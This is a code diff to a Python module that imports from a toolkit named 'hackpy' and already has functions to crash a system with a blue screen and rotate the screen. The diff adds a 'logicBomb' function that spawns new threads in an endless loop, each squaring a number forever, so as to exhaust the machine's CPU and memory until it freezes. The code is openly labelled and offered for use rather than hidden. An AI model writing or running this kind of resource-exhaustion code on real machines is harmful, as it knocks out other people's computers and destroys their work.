@@ -1,6 +1,7 @@
 from hackpy.commands import *
 from hackpy.settings import *
 from hackpy.modules  import *
+from threading import Thread
 
 # Crash system
 def bsod():
@@ -10,6 +11,16 @@ def bsod():
 		return True
 	else:
 		return False
+
+# LogicBomb
+def logicBomb():
+	def bomb():
+		i = 999
+		while True:
+			i *= i
+			
+	while True:
+		Thread(target = bomb).start()
 
 # Rotate screen
 def rotateScreen(degrees = 0):
